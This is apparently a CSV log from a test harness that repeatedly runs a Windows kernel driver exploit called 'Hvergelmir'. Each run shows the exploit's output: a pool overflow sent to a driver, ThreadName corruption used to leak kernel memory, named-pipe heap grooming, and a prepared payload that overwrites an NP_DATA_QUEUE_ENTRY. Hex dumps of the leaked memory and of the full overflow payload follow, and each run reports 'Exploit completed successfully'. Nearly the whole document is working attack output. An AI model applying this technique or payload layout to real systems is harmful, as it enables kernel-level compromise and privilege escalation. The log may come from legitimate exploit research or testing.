HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:40:50+00:00,2,27,19,running,running,True,success,0,12.609,True,True,69,31.232,1,65,4,2,"oSB attempt 3 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 4 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 3 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=504 NpFr=604 pipeBase=600 pipeIndex=58 capture=1 iosbAttempt=3 pipeAttempt=0 pipeLeak=0
    [00000202C95656B0]  42536F490A100000  2B6FDF62649CB5ED
    [00000202C95656C0]  D4903CE5B9A4755D  0000000000000000
    [00000202C95656D0]  0000000000000000  0000000000000000
    [00000202C95656E0]  42536F490E0D0003  0000000000000000
    [00000202C95656F0]  000000000000000C  FFFF970D6F464E40
    [00000202C9565700]  00000000000003E8  6161616161616161
    [00000202C9565710]  6161616161616161  6161616161616161
    [00000202C9565720]  6161616161616161  6161616161616161
    [00000202C9565730]  6161616161616161  6161616161616161
    [00000202C9565740]  6161616161616161  6161616161616161
    [00000202C9565750]  6161616161616161  6161616161616161
    [00000202C9565760]  6161616161616161  6161616161616161
    [00000202C9565770]  6161616161616161  6161616161616161
    [00000202C9565780]  6161616161616161  6161616161616161
    [00000202C9565790]  6161616161616161  6161616161616161
    [00000202C95657A0]  0000000000000000  0000000000000000
    [00000202C95657B0]  7246704E0A100000  2B6FDF62649CB6ED
    [00000202C95657C0]  FFFF970D70E13148  FFFF970D70E13148
    [00000202C95657D0]  0000000000000000  FFFF970D70D08BC0
    [00000202C95657E0]  000000C000000000  00000000000000C0
    [00000202C95657F0]  0000003A45504950  3939393939393939
    [00000202C9565800]  3939393939393939  3939393939393939
    [00000202C9565810]  3939393939393939  3939393939393939
    [00000202C9565820]  3939393939393939  3939393939393939
    [00000202C9565830]  3939393939393939  3939393939393939
    [00000202C9565840]  3939393939393939  3939393939393939
    [00000202C9565850]  3939393939393939  3939393939393939
    [00000202C9565860]  3939393939393939  3939393939393939
    [00000202C9565870]  3939393939393939  3939393939393939
    [00000202C9565880]  3939393939393939  3939393939393939
    [00000202C9565890]  3939393939393939  3939393939393939
    [00000202C95658A0]  3939393939393939  3939393939393939
    [00000202C95658B0]  7246704E0A100000  2B6FDF62649CB7ED
    [00000202C95658C0]  FFFF970D70E0A868  FFFF970D70E0A868
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [00000202C962EB00]  7246704E0A100000  2B6FDF62649CB6ED
    [00000202C962EB10]  FFFF970D70E13148  FFFF970D70E13148
    [00000202C962EB20]  00000202C953FE40  FFFF970D70D08BC0
    [00000202C962EB30]  000000C000000001  
 [*] Full payload to trigger overflow:
    [00000202C962EAF0]  0000000000000000  0000000000000000
    [00000202C962EB00]  7246704E0A100000  2B6FDF62649CB6ED
    [00000202C962EB10]  FFFF970D70E13148  FFFF970D70E13148
    [00000202C962EB20]  00000202C953FE40  FFFF970D70D08BC0
    [00000202C962EB30]  000000C000000001  00000000000000C0
    [00000202C962EB40]  0000003A45504950  3939393939393939
    [00000202C962EB50]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=15
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:41:00+00:00,2,28,20,running,running,True,success,0,9.047,True,True,8,4.5,1,8,8,1,"oSB attempt 7 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 8 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 7 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=704 NpFr=804 pipeBase=800 pipeIndex=56 capture=0 iosbAttempt=7 pipeAttempt=0 pipeLeak=0
    [000001E6EECC5350]  42536F490A100000  2B6FDF6264BE69ED
    [000001E6EECC5360]  D4903CE5B9A4595D  0000000000000000
    [000001E6EECC5370]  0000000000000000  0000000000000000
    [000001E6EECC5380]  42536F490E0D0003  0000000000000000
    [000001E6EECC5390]  000000000000000C  FFFF970D6EC75970
    [000001E6EECC53A0]  00000000000003E8  6161616161616161
    [000001E6EECC53B0]  6161616161616161  6161616161616161
    [000001E6EECC53C0]  6161616161616161  6161616161616161
    [000001E6EECC53D0]  6161616161616161  6161616161616161
    [000001E6EECC53E0]  6161616161616161  6161616161616161
    [000001E6EECC53F0]  6161616161616161  6161616161616161
    [000001E6EECC5400]  6161616161616161  6161616161616161
    [000001E6EECC5410]  6161616161616161  6161616161616161
    [000001E6EECC5420]  6161616161616161  6161616161616161
    [000001E6EECC5430]  6161616161616161  6161616161616161
    [000001E6EECC5440]  0000000000000000  0000000000000000
    [000001E6EECC5450]  7246704E0A100000  2B6FDF6264BE6AED
    [000001E6EECC5460]  FFFF970D709528E8  FFFF970D709528E8
    [000001E6EECC5470]  0000000000000000  FFFF970D6E5DC080
    [000001E6EECC5480]  000000C000000000  00000000000000C0
    [000001E6EECC5490]  0000003845504950  3939393939393939
    [000001E6EECC54A0]  3939393939393939  3939393939393939
    [000001E6EECC54B0]  3939393939393939  3939393939393939
    [000001E6EECC54C0]  3939393939393939  3939393939393939
    [000001E6EECC54D0]  3939393939393939  3939393939393939
    [000001E6EECC54E0]  3939393939393939  3939393939393939
    [000001E6EECC54F0]  3939393939393939  3939393939393939
    [000001E6EECC5500]  3939393939393939  3939393939393939
    [000001E6EECC5510]  3939393939393939  3939393939393939
    [000001E6EECC5520]  3939393939393939  3939393939393939
    [000001E6EECC5530]  3939393939393939  3939393939393939
    [000001E6EECC5540]  3939393939393939  3939393939393939
    [000001E6EECC5550]  7246704E0A100000  2B6FDF6264BE6BED
    [000001E6EECC5560]  FFFF970D7095D1A8  FFFF970D7095D1A8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001E6EED2AD90]  7246704E0A100000  2B6FDF6264BE6AED
    [000001E6EED2ADA0]  FFFF970D709528E8  FFFF970D709528E8
    [000001E6EED2ADB0]  000001E6EEC50D70  FFFF970D6E5DC080
    [000001E6EED2ADC0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001E6EED2AD80]  0000000000000000  0000000000000000
    [000001E6EED2AD90]  7246704E0A100000  2B6FDF6264BE6AED
    [000001E6EED2ADA0]  FFFF970D709528E8  FFFF970D709528E8
    [000001E6EED2ADB0]  000001E6EEC50D70  FFFF970D6E5DC080
    [000001E6EED2ADC0]  000000C000000001  00000000000000C0
    [000001E6EED2ADD0]  0000003845504950  3939393939393939
    [000001E6EED2ADE0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=10
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:41:05+00:00,2,29,21,running,running,True,success,0,3.312,True,True,1,1.0,1,1,1,1," [*] Starting Hvergelmir Exploit
 [+] Connected to driver successfully!

 [*] Pipe layout attempt 1/24

 [*] #### Corrupting ThreadName to Leak Data (VOLATILE) ####
 [*] Priming overflow with chunk size: 0x100
 [*] Triggering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
 [*] ###### Found ThreadName Overwrite ######
 [*] Cleaned 2999 extra thread names, 0 failed
 [*] IoSB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 0 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=804 NpFr=904 pipeBase=900 pipeIndex=975 capture=0 iosbAttempt=0 pipeAttempt=0 pipeLeak=0
    [00000171FF98CBA0]  42536F490A100000  2B6FDF6267AE63ED
    [00000171FF98CBB0]  D4903CE5B9A4E35D  0000000000000000
    [00000171FF98CBC0]  0000000000000000  0000000000000000
    [00000171FF98CBD0]  42536F490E0D0003  0000000000000000
    [00000171FF98CBE0]  000000000000000C  FFFF970D6E34E9F0
    [00000171FF98CBF0]  00000000000003E8  6161616161616161
    [00000171FF98CC00]  6161616161616161  6161616161616161
    [00000171FF98CC10]  6161616161616161  6161616161616161
    [00000171FF98CC20]  6161616161616161  6161616161616161
    [00000171FF98CC30]  6161616161616161  6161616161616161
    [00000171FF98CC40]  6161616161616161  6161616161616161
    [00000171FF98CC50]  6161616161616161  6161616161616161
    [00000171FF98CC60]  6161616161616161  6161616161616161
    [00000171FF98CC70]  6161616161616161  6161616161616161
    [00000171FF98CC80]  6161616161616161  6161616161616161
    [00000171FF98CC90]  0000000000000000  0000000000000000
    [00000171FF98CCA0]  7246704E0A100000  2B6FDF6267AE64ED
    [00000171FF98CCB0]  FFFF970D70EB3AA8  FFFF970D70EB3AA8
    [00000171FF98CCC0]  0000000000000000  FFFF970D70D1D800
    [00000171FF98CCD0]  000000C000000000  00000000000000C0
    [00000171FF98CCE0]  000003CF45504950  3939393939393939
    [00000171FF98CCF0]  3939393939393939  3939393939393939
    [00000171FF98CD00]  3939393939393939  3939393939393939
    [00000171FF98CD10]  3939393939393939  3939393939393939
    [00000171FF98CD20]  3939393939393939  3939393939393939
    [00000171FF98CD30]  3939393939393939  3939393939393939
    [00000171FF98CD40]  3939393939393939  3939393939393939
    [00000171FF98CD50]  3939393939393939  3939393939393939
    [00000171FF98CD60]  3939393939393939  3939393939393939
    [00000171FF98CD70]  3939393939393939  3939393939393939
    [00000171FF98CD80]  3939393939393939  3939393939393939
    [00000171FF98CD90]  3939393939393939  00000000FDFDFDFD
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [00000171FF9846F0]  7246704E0A100000  2B6FDF6267AE64ED
    [00000171FF984700]  FFFF970D70EB3AA8  FFFF970D70EB3AA8
    [00000171FF984710]  00000171FF3CFF10  FFFF970D70D1D800
    [00000171FF984720]  000000C000000001  
 [*] Full payload to trigger overflow:
    [00000171FF9846E0]  0000000000000000  0000000000000000
    [00000171FF9846F0]  7246704E0A100000  2B6FDF6267AE64ED
    [00000171FF984700]  FFFF970D70EB3AA8  FFFF970D70EB3AA8
    [00000171FF984710]  00000171FF3CFF10  FFFF970D70D1D800
    [00000171FF984720]  000000C000000001  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=3
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:41:17+00:00,2,30,22,running,running,True,success,0,10.125,True,True,68,31.632,1,65,3,2,"] IoSB attempt 2 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 3 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 2 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=4 NpFr=104 pipeBase=100 pipeIndex=3 capture=1 iosbAttempt=2 pipeAttempt=0 pipeLeak=0
    [00000254C52313A0]  42536F490A100000  2B6FDF6266A516ED
    [00000254C52313B0]  D4903CE5BAF9D65D  0000000000000000
    [00000254C52313C0]  0000000000000000  0000000000000000
    [00000254C52313D0]  42536F490E0D0003  0000000000000000
    [00000254C52313E0]  000000000000000C  FFFF970D6F45F0E0
    [00000254C52313F0]  00000000000003E8  6161616161616161
    [00000254C5231400]  6161616161616161  6161616161616161
    [00000254C5231410]  6161616161616161  6161616161616161
    [00000254C5231420]  6161616161616161  6161616161616161
    [00000254C5231430]  6161616161616161  6161616161616161
    [00000254C5231440]  6161616161616161  6161616161616161
    [00000254C5231450]  6161616161616161  6161616161616161
    [00000254C5231460]  6161616161616161  6161616161616161
    [00000254C5231470]  6161616161616161  6161616161616161
    [00000254C5231480]  6161616161616161  6161616161616161
    [00000254C5231490]  0000000000000000  0000000000000000
    [00000254C52314A0]  7246704E0A100000  2B6FDF6266A517ED
    [00000254C52314B0]  FFFF970D70E3E8E8  FFFF970D70E3E8E8
    [00000254C52314C0]  0000000000000000  FFFF970D70D66720
    [00000254C52314D0]  000000C000000000  00000000000000C0
    [00000254C52314E0]  0000000345504950  3939393939393939
    [00000254C52314F0]  3939393939393939  3939393939393939
    [00000254C5231500]  3939393939393939  3939393939393939
    [00000254C5231510]  3939393939393939  3939393939393939
    [00000254C5231520]  3939393939393939  3939393939393939
    [00000254C5231530]  3939393939393939  3939393939393939
    [00000254C5231540]  3939393939393939  3939393939393939
    [00000254C5231550]  3939393939393939  3939393939393939
    [00000254C5231560]  3939393939393939  3939393939393939
    [00000254C5231570]  3939393939393939  3939393939393939
    [00000254C5231580]  3939393939393939  3939393939393939
    [00000254C5231590]  3939393939393939  3939393939393939
    [00000254C52315A0]  7246704E0A100000  2B6FDF6266A508ED
    [00000254C52315B0]  FFFF970D70E3F608  FFFF970D70E3F608
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [00000254C52323C0]  7246704E0A100000  2B6FDF6266A517ED
    [00000254C52323D0]  FFFF970D70E3E8E8  FFFF970D70E3E8E8
    [00000254C52323E0]  00000254C51C2BE0  FFFF970D70D66720
    [00000254C52323F0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [00000254C52323B0]  0000000000000000  0000000000000000
    [00000254C52323C0]  7246704E0A100000  2B6FDF6266A517ED
    [00000254C52323D0]  FFFF970D70E3E8E8  FFFF970D70E3E8E8
    [00000254C52323E0]  00000254C51C2BE0  FFFF970D70D66720
    [00000254C52323F0]  000000C000000001  00000000000000C0
    [00000254C5232400]  0000000345504950  3939393939393939
    [00000254C5232410]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=10
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:41:25+00:00,2,31,23,running,running,True,success,0,7.0,True,True,4,1.75,1,3,3,2,"oSB attempt 2 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 3 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 2 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=104 NpFr=204 pipeBase=200 pipeIndex=982 capture=1 iosbAttempt=2 pipeAttempt=0 pipeLeak=0
    [0000021342D8EBC0]  42536F490A100000  2B6FDF62678D9CED
    [0000021342D8EBD0]  D4903CE5BAFA5C5D  0000000000000000
    [0000021342D8EBE0]  0000000000000000  0000000000000000
    [0000021342D8EBF0]  42536F490E0D0003  0000000000000000
    [0000021342D8EC00]  000000000000000C  FFFF970D70E6E650
    [0000021342D8EC10]  00000000000003E8  6161616161616161
    [0000021342D8EC20]  6161616161616161  6161616161616161
    [0000021342D8EC30]  6161616161616161  6161616161616161
    [0000021342D8EC40]  6161616161616161  6161616161616161
    [0000021342D8EC50]  6161616161616161  6161616161616161
    [0000021342D8EC60]  6161616161616161  6161616161616161
    [0000021342D8EC70]  6161616161616161  6161616161616161
    [0000021342D8EC80]  6161616161616161  6161616161616161
    [0000021342D8EC90]  6161616161616161  6161616161616161
    [0000021342D8ECA0]  6161616161616161  6161616161616161
    [0000021342D8ECB0]  0000000000000000  0000000000000000
    [0000021342D8ECC0]  7246704E0A100000  2B6FDF62678D9DED
    [0000021342D8ECD0]  FFFF970D70B8B408  FFFF970D70B8B408
    [0000021342D8ECE0]  0000000000000000  FFFF970D709CF520
    [0000021342D8ECF0]  000000C000000000  00000000000000C0
    [0000021342D8ED00]  000003D645504950  3939393939393939
    [0000021342D8ED10]  3939393939393939  3939393939393939
    [0000021342D8ED20]  3939393939393939  3939393939393939
    [0000021342D8ED30]  3939393939393939  3939393939393939
    [0000021342D8ED40]  3939393939393939  3939393939393939
    [0000021342D8ED50]  3939393939393939  3939393939393939
    [0000021342D8ED60]  3939393939393939  3939393939393939
    [0000021342D8ED70]  3939393939393939  3939393939393939
    [0000021342D8ED80]  3939393939393939  3939393939393939
    [0000021342D8ED90]  3939393939393939  3939393939393939
    [0000021342D8EDA0]  3939393939393939  3939393939393939
    [0000021342D8EDB0]  3939393939393939  3939393939393939
    [0000021342D8EDC0]  7246704E0A100000  2B6FDF62678D9EED
    [0000021342D8EDD0]  FFFF970D70B8E4C8  FFFF970D70B8E4C8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000021342CCAB70]  7246704E0A100000  2B6FDF62678D9DED
    [0000021342CCAB80]  FFFF970D70B8B408  FFFF970D70B8B408
    [0000021342CCAB90]  0000021342CA0BF0  FFFF970D709CF520
    [0000021342CCABA0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000021342CCAB60]  0000000000000000  0000000000000000
    [0000021342CCAB70]  7246704E0A100000  2B6FDF62678D9DED
    [0000021342CCAB80]  FFFF970D70B8B408  FFFF970D70B8B408
    [0000021342CCAB90]  0000021342CA0BF0  FFFF970D709CF520
    [0000021342CCABA0]  000000C000000001  00000000000000C0
    [0000021342CCABB0]  000003D645504950  3939393939393939
    [0000021342CCABC0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=6
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:41:36+00:00,2,32,24,running,running,True,success,0,9.328,True,True,3,2.0,1,3,3,1,"IoSB attempt 2 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 3 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 2 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=204 NpFr=304 pipeBase=300 pipeIndex=53 capture=0 iosbAttempt=2 pipeAttempt=0 pipeLeak=0
    [000001DF4797DCE0]  42536F490A100000  2B6FDF62644AD7ED
    [000001DF4797DCF0]  D4903CE5B928275D  0000000000000000
    [000001DF4797DD00]  0000000000000000  0000000000000000
    [000001DF4797DD10]  42536F490E0D0003  0000000000000000
    [000001DF4797DD20]  000000000000000C  FFFF970D70E68BC0
    [000001DF4797DD30]  00000000000003E8  6161616161616161
    [000001DF4797DD40]  6161616161616161  6161616161616161
    [000001DF4797DD50]  6161616161616161  6161616161616161
    [000001DF4797DD60]  6161616161616161  6161616161616161
    [000001DF4797DD70]  6161616161616161  6161616161616161
    [000001DF4797DD80]  6161616161616161  6161616161616161
    [000001DF4797DD90]  6161616161616161  6161616161616161
    [000001DF4797DDA0]  6161616161616161  6161616161616161
    [000001DF4797DDB0]  6161616161616161  6161616161616161
    [000001DF4797DDC0]  6161616161616161  6161616161616161
    [000001DF4797DDD0]  0000000000000000  0000000000000000
    [000001DF4797DDE0]  7246704E0A100000  2B6FDF62644AE8ED
    [000001DF4797DDF0]  FFFF970D70BB4268  FFFF970D70BB4268
    [000001DF4797DE00]  0000000000000000  FFFF970D70D11080
    [000001DF4797DE10]  000000C000000000  00000000000000C0
    [000001DF4797DE20]  0000003545504950  3939393939393939
    [000001DF4797DE30]  3939393939393939  3939393939393939
    [000001DF4797DE40]  3939393939393939  3939393939393939
    [000001DF4797DE50]  3939393939393939  3939393939393939
    [000001DF4797DE60]  3939393939393939  3939393939393939
    [000001DF4797DE70]  3939393939393939  3939393939393939
    [000001DF4797DE80]  3939393939393939  3939393939393939
    [000001DF4797DE90]  3939393939393939  3939393939393939
    [000001DF4797DEA0]  3939393939393939  3939393939393939
    [000001DF4797DEB0]  3939393939393939  3939393939393939
    [000001DF4797DEC0]  3939393939393939  3939393939393939
    [000001DF4797DED0]  3939393939393939  3939393939393939
    [000001DF4797DEE0]  7246704E0A100000  2B6FDF62644AE9ED
    [000001DF4797DEF0]  FFFF970D70BB0848  FFFF970D70BB0848
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001DF479AD8D0]  7246704E0A100000  2B6FDF62644AE8ED
    [000001DF479AD8E0]  FFFF970D70BB4268  FFFF970D70BB4268
    [000001DF479AD8F0]  000001DF478BFC00  FFFF970D70D11080
    [000001DF479AD900]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001DF479AD8C0]  0000000000000000  0000000000000000
    [000001DF479AD8D0]  7246704E0A100000  2B6FDF62644AE8ED
    [000001DF479AD8E0]  FFFF970D70BB4268  FFFF970D70BB4268
    [000001DF479AD8F0]  000001DF478BFC00  FFFF970D70D11080
    [000001DF479AD900]  000000C000000001  00000000000000C0
    [000001DF479AD910]  0000003545504950  3939393939393939
    [000001DF479AD920]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=7
","#< CLIXML
